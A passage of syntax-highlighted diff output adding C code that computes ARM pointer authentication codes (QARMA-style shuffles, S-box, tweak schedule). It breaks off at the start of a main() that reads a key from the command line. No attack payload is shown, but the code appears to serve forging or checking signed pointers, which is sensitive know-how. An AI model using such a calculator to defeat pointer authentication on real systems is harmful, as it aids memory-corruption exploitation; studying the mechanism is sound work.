+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>16</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>56</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>60</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>60</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> o;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>uint64_t</span> <span style=color:#06287e>pac_cell_inv_shuffle</span>(<span style=color:#902000>uint64_t</span> i)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#902000>uint64_t</span> o <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>12</span>, <span style=color:#40a070>4</span>);
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>24</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>4</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>48</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>36</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>12</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>56</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>16</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>44</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>20</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i,  <span style=color:#40a070>4</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>24</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>16</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>28</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> i <span style=color:#666>&amp;</span> MAKE_64BIT_MASK(<span style=color:#40a070>32</span>, <span style=color:#40a070>4</span>);
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>52</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>36</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>28</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>40</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i,  <span style=color:#40a070>8</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>44</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>20</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>48</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i,  <span style=color:#40a070>0</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>52</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>40</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>56</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> i <span style=color:#666>&amp;</span> MAKE_64BIT_MASK(<span style=color:#40a070>60</span>, <span style=color:#40a070>4</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> o;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>uint64_t</span> <span style=color:#06287e>pac_sub</span>(<span style=color:#902000>uint64_t</span> i)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>uint8_t</span> sub[<span style=color:#40a070>16</span>] <span style=color:#666>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#40a070>0xb</span>, <span style=color:#40a070>0x6</span>, <span style=color:#40a070>0x8</span>, <span style=color:#40a070>0xf</span>, <span style=color:#40a070>0xc</span>, <span style=color:#40a070>0x0</span>, <span style=color:#40a070>0x9</span>, <span style=color:#40a070>0xe</span>,
+</span></span><span style=display:flex><span>        <span style=color:#40a070>0x3</span>, <span style=color:#40a070>0x7</span>, <span style=color:#40a070>0x4</span>, <span style=color:#40a070>0x5</span>, <span style=color:#40a070>0xd</span>, <span style=color:#40a070>0x2</span>, <span style=color:#40a070>0x1</span>, <span style=color:#40a070>0xa</span>,
+</span></span><span style=display:flex><span>    };
+</span></span><span style=display:flex><span>    <span style=color:#902000>uint64_t</span> o <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> b;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (b <span style=color:#666>=</span> <span style=color:#40a070>0</span>; b <span style=color:#666>&lt;</span> <span style=color:#40a070>64</span>; b <span style=color:#666>+=</span> <span style=color:#40a070>4</span>) {
+</span></span><span style=display:flex><span>        o <span style=color:#666>|=</span> (<span style=color:#902000>uint64_t</span>)sub[(i <span style=color:#666>&gt;&gt;</span> b) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xf</span>] <span style=color:#666>&lt;&lt;</span> b;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> o;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>uint64_t</span> <span style=color:#06287e>pac_inv_sub</span>(<span style=color:#902000>uint64_t</span> i)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>uint8_t</span> inv_sub[<span style=color:#40a070>16</span>] <span style=color:#666>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#40a070>0x5</span>, <span style=color:#40a070>0xe</span>, <span style=color:#40a070>0xd</span>, <span style=color:#40a070>0x8</span>, <span style=color:#40a070>0xa</span>, <span style=color:#40a070>0xb</span>, <span style=color:#40a070>0x1</span>, <span style=color:#40a070>0x9</span>,
+</span></span><span style=display:flex><span>        <span style=color:#40a070>0x2</span>, <span style=color:#40a070>0x6</span>, <span style=color:#40a070>0xf</span>, <span style=color:#40a070>0x0</span>, <span style=color:#40a070>0x4</span>, <span style=color:#40a070>0xc</span>, <span style=color:#40a070>0x7</span>, <span style=color:#40a070>0x3</span>,
+</span></span><span style=display:flex><span>    };
+</span></span><span style=display:flex><span>    <span style=color:#902000>uint64_t</span> o <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> b;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (b <span style=color:#666>=</span> <span style=color:#40a070>0</span>; b <span style=color:#666>&lt;</span> <span style=color:#40a070>64</span>; b <span style=color:#666>+=</span> <span style=color:#40a070>4</span>) {
+</span></span><span style=display:flex><span>        o <span style=color:#666>|=</span> (<span style=color:#902000>uint64_t</span>)inv_sub[(i <span style=color:#666>&gt;&gt;</span> b) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xf</span>] <span style=color:#666>&lt;&lt;</span> b;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> o;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>uint64_t</span> <span style=color:#06287e>pac_mult</span>(<span style=color:#902000>uint64_t</span> i)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#902000>uint64_t</span> o <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> b;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (b <span style=color:#666>=</span> <span style=color:#40a070>0</span>; b <span style=color:#666>&lt;</span> <span style=color:#40a070>4</span> <span style=color:#666>*</span> <span style=color:#40a070>4</span>; b <span style=color:#666>+=</span> <span style=color:#40a070>4</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> i0, i4, i8, ic, t0, t1, t2, t3;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        i0 <span style=color:#666>=</span> extract64(i, b, <span style=color:#40a070>4</span>);
+</span></span><span style=display:flex><span>        i4 <span style=color:#666>=</span> extract64(i, b <span style=color:#666>+</span> <span style=color:#40a070>4</span> <span style=color:#666>*</span> <span style=color:#40a070>4</span>, <span style=color:#40a070>4</span>);
+</span></span><span style=display:flex><span>        i8 <span style=color:#666>=</span> extract64(i, b <span style=color:#666>+</span> <span style=color:#40a070>8</span> <span style=color:#666>*</span> <span style=color:#40a070>4</span>, <span style=color:#40a070>4</span>);
+</span></span><span style=display:flex><span>        ic <span style=color:#666>=</span> extract64(i, b <span style=color:#666>+</span> <span style=color:#40a070>12</span> <span style=color:#666>*</span> <span style=color:#40a070>4</span>, <span style=color:#40a070>4</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        t0 <span style=color:#666>=</span> rot_cell(i8, <span style=color:#40a070>1</span>) <span style=color:#666>^</span> rot_cell(i4, <span style=color:#40a070>2</span>) <span style=color:#666>^</span> rot_cell(i0, <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>        t1 <span style=color:#666>=</span> rot_cell(ic, <span style=color:#40a070>1</span>) <span style=color:#666>^</span> rot_cell(i4, <span style=color:#40a070>1</span>) <span style=color:#666>^</span> rot_cell(i0, <span style=color:#40a070>2</span>);
+</span></span><span style=display:flex><span>        t2 <span style=color:#666>=</span> rot_cell(ic, <span style=color:#40a070>2</span>) <span style=color:#666>^</span> rot_cell(i8, <span style=color:#40a070>1</span>) <span style=color:#666>^</span> rot_cell(i0, <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>        t3 <span style=color:#666>=</span> rot_cell(ic, <span style=color:#40a070>1</span>) <span style=color:#666>^</span> rot_cell(i8, <span style=color:#40a070>2</span>) <span style=color:#666>^</span> rot_cell(i4, <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        o <span style=color:#666>|=</span> (<span style=color:#902000>uint64_t</span>)t3 <span style=color:#666>&lt;&lt;</span> b;
+</span></span><span style=display:flex><span>        o <span style=color:#666>|=</span> (<span style=color:#902000>uint64_t</span>)t2 <span style=color:#666>&lt;&lt;</span> (b <span style=color:#666>+</span> <span style=color:#40a070>4</span> <span style=color:#666>*</span> <span style=color:#40a070>4</span>);
+</span></span><span style=display:flex><span>        o <span style=color:#666>|=</span> (<span style=color:#902000>uint64_t</span>)t1 <span style=color:#666>&lt;&lt;</span> (b <span style=color:#666>+</span> <span style=color:#40a070>8</span> <span style=color:#666>*</span> <span style=color:#40a070>4</span>);
+</span></span><span style=display:flex><span>        o <span style=color:#666>|=</span> (<span style=color:#902000>uint64_t</span>)t0 <span style=color:#666>&lt;&lt;</span> (b <span style=color:#666>+</span> <span style=color:#40a070>12</span> <span style=color:#666>*</span> <span style=color:#40a070>4</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> o;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>uint64_t</span> <span style=color:#06287e>tweak_cell_rot</span>(<span style=color:#902000>uint64_t</span> cell)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> (cell <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>1</span>) <span style=color:#666>|</span> (((cell <span style=color:#666>^</span> (cell <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>1</span>)) <span style=color:#666>&amp;</span> <span style=color:#40a070>1</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>3</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>uint64_t</span> <span style=color:#06287e>tweak_shuffle</span>(<span style=color:#902000>uint64_t</span> i)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#902000>uint64_t</span> o <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>16</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>20</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>4</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> tweak_cell_rot(extract64(i, <span style=color:#40a070>24</span>, <span style=color:#40a070>4</span>)) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>28</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>12</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> tweak_cell_rot(extract64(i, <span style=color:#40a070>44</span>, <span style=color:#40a070>4</span>)) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>16</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i,  <span style=color:#40a070>8</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>20</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>12</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>24</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> tweak_cell_rot(extract64(i, <span style=color:#40a070>32</span>, <span style=color:#40a070>4</span>)) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>28</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>48</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>32</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>52</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>36</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>56</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>40</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> tweak_cell_rot(extract64(i, <span style=color:#40a070>60</span>, <span style=color:#40a070>4</span>)) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>44</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> tweak_cell_rot(extract64(i,  <span style=color:#40a070>0</span>, <span style=color:#40a070>4</span>)) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>48</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i,  <span style=color:#40a070>4</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>52</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> tweak_cell_rot(extract64(i, <span style=color:#40a070>40</span>, <span style=color:#40a070>4</span>)) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>56</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> tweak_cell_rot(extract64(i, <span style=color:#40a070>36</span>, <span style=color:#40a070>4</span>)) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>60</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> o;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>uint64_t</span> <span style=color:#06287e>tweak_cell_inv_rot</span>(<span style=color:#902000>uint64_t</span> cell)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> ((cell <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>1</span>) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xf</span>) <span style=color:#666>|</span> ((cell <span style=color:#666>&amp;</span> <span style=color:#40a070>1</span>) <span style=color:#666>^</span> (cell <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>3</span>));
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>uint64_t</span> <span style=color:#06287e>tweak_inv_shuffle</span>(<span style=color:#902000>uint64_t</span> i)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#902000>uint64_t</span> o <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> tweak_cell_inv_rot(extract64(i, <span style=color:#40a070>48</span>, <span style=color:#40a070>4</span>));
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>52</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>4</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>20</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>24</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>12</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i,  <span style=color:#40a070>0</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>16</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i,  <span style=color:#40a070>4</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>20</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> tweak_cell_inv_rot(extract64(i,  <span style=color:#40a070>8</span>, <span style=color:#40a070>4</span>)) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>24</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>12</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>28</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> tweak_cell_inv_rot(extract64(i, <span style=color:#40a070>28</span>, <span style=color:#40a070>4</span>)) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>32</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> tweak_cell_inv_rot(extract64(i, <span style=color:#40a070>60</span>, <span style=color:#40a070>4</span>)) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>36</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> tweak_cell_inv_rot(extract64(i, <span style=color:#40a070>56</span>, <span style=color:#40a070>4</span>)) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>40</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> tweak_cell_inv_rot(extract64(i, <span style=color:#40a070>16</span>, <span style=color:#40a070>4</span>)) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>44</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>32</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>48</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>36</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>52</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> extract64(i, <span style=color:#40a070>40</span>, <span style=color:#40a070>4</span>) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>56</span>;
+</span></span><span style=display:flex><span>    o <span style=color:#666>|=</span> tweak_cell_inv_rot(extract64(i, <span style=color:#40a070>44</span>, <span style=color:#40a070>4</span>)) <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>60</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> o;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>uint64_t</span> <span style=color:#06287e>pauth_computepac_architected</span>(<span style=color:#902000>uint64_t</span> data, <span style=color:#902000>uint64_t</span> modifier,
+</span></span><span style=display:flex><span>                                             <span style=color:#902000>uint64_t</span> key0, <span style=color:#902000>uint64_t</span> key1)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>uint64_t</span> RC[<span style=color:#40a070>5</span>] <span style=color:#666>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#40a070>0x0000000000000000ull</span>,
+</span></span><span style=display:flex><span>        <span style=color:#40a070>0x13198A2E03707344ull</span>,
+</span></span><span style=display:flex><span>        <span style=color:#40a070>0xA4093822299F31D0ull</span>,
+</span></span><span style=display:flex><span>        <span style=color:#40a070>0x082EFA98EC4E6C89ull</span>,
+</span></span><span style=display:flex><span>        <span style=color:#40a070>0x452821E638D01377ull</span>,
+</span></span><span style=display:flex><span>    };
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>uint64_t</span> alpha <span style=color:#666>=</span> <span style=color:#40a070>0xC0AC29B7C97C50DDull</span>;
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>/*
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>     * Note that in the ARM pseudocode, key0 contains bits &lt;127:64&gt;
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>     * and key1 contains bits &lt;63:0&gt; of the 128-bit key.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>     */</span>
+</span></span><span style=display:flex><span>    <span style=color:#902000>uint64_t</span> workingval, runningmod, roundkey, modk0;
+</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> i;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    modk0 <span style=color:#666>=</span> (key0 <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>63</span>) <span style=color:#666>|</span> ((key0 <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>1</span>) <span style=color:#666>^</span> (key0 <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>63</span>));
+</span></span><span style=display:flex><span>    runningmod <span style=color:#666>=</span> modifier;
+</span></span><span style=display:flex><span>    workingval <span style=color:#666>=</span> data <span style=color:#666>^</span> key0;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;=</span> <span style=color:#40a070>4</span>; <span style=color:#666>++</span>i) {
+</span></span><span style=display:flex><span>        roundkey <span style=color:#666>=</span> key1 <span style=color:#666>^</span> runningmod;
+</span></span><span style=display:flex><span>        workingval <span style=color:#666>^=</span> roundkey;
+</span></span><span style=display:flex><span>        workingval <span style=color:#666>^=</span> RC[i];
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (i <span style=color:#666>&gt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>            workingval <span style=color:#666>=</span> pac_cell_shuffle(workingval);
+</span></span><span style=display:flex><span>            workingval <span style=color:#666>=</span> pac_mult(workingval);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        workingval <span style=color:#666>=</span> pac_sub(workingval);
+</span></span><span style=display:flex><span>        runningmod <span style=color:#666>=</span> tweak_shuffle(runningmod);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    roundkey <span style=color:#666>=</span> modk0 <span style=color:#666>^</span> runningmod;
+</span></span><span style=display:flex><span>    workingval <span style=color:#666>^=</span> roundkey;
+</span></span><span style=display:flex><span>    workingval <span style=color:#666>=</span> pac_cell_shuffle(workingval);
+</span></span><span style=display:flex><span>    workingval <span style=color:#666>=</span> pac_mult(workingval);
+</span></span><span style=display:flex><span>    workingval <span style=color:#666>=</span> pac_sub(workingval);
+</span></span><span style=display:flex><span>    workingval <span style=color:#666>=</span> pac_cell_shuffle(workingval);
+</span></span><span style=display:flex><span>    workingval <span style=color:#666>=</span> pac_mult(workingval);
+</span></span><span style=display:flex><span>    workingval <span style=color:#666>^=</span> key1;
+</span></span><span style=display:flex><span>    workingval <span style=color:#666>=</span> pac_cell_inv_shuffle(workingval);
+</span></span><span style=display:flex><span>    workingval <span style=color:#666>=</span> pac_inv_sub(workingval);
+</span></span><span style=display:flex><span>    workingval <span style=color:#666>=</span> pac_mult(workingval);
+</span></span><span style=display:flex><span>    workingval <span style=color:#666>=</span> pac_cell_inv_shuffle(workingval);
+</span></span><span style=display:flex><span>    workingval <span style=color:#666>^=</span> key0;
+</span></span><span style=display:flex><span>    workingval <span style=color:#666>^=</span> runningmod;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;=</span> <span style=color:#40a070>4</span>; <span style=color:#666>++</span>i) {
+</span></span><span style=display:flex><span>        workingval <span style=color:#666>=</span> pac_inv_sub(workingval);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (i <span style=color:#666>&lt;</span> <span style=color:#40a070>4</span>) {
+</span></span><span style=display:flex><span>            workingval <span style=color:#666>=</span> pac_mult(workingval);
+</span></span><span style=display:flex><span>            workingval <span style=color:#666>=</span> pac_cell_inv_shuffle(workingval);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        runningmod <span style=color:#666>=</span> tweak_inv_shuffle(runningmod);
+</span></span><span style=display:flex><span>        roundkey <span style=color:#666>=</span> key1 <span style=color:#666>^</span> runningmod;
+</span></span><span style=display:flex><span>        workingval <span style=color:#666>^=</span> RC[<span style=color:#40a070>4</span> <span style=color:#666>-</span> i];
+</span></span><span style=display:flex><span>        workingval <span style=color:#666>^=</span> roundkey;
+</span></span><span style=display:flex><span>        workingval <span style=color:#666>^=</span> alpha;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    workingval <span style=color:#666>^=</span> modk0;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> workingval;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>(<span style=color:#902000>int</span> argc, <span style=color:#902000>char</span><span style=color:#666>**</span> argv) {
+</span></span><span style=display:flex><span>    <span style=color:#902000>uint64_t</span> api1, api2;
+</span></span><span style=display:flex><span>    sscanf(argv[<span style=color:#40a070>1</span>], <span style=color:#4070a0>&#34;%llx&#34;</span>, <span style=color:#666>&amp;</span>api1);
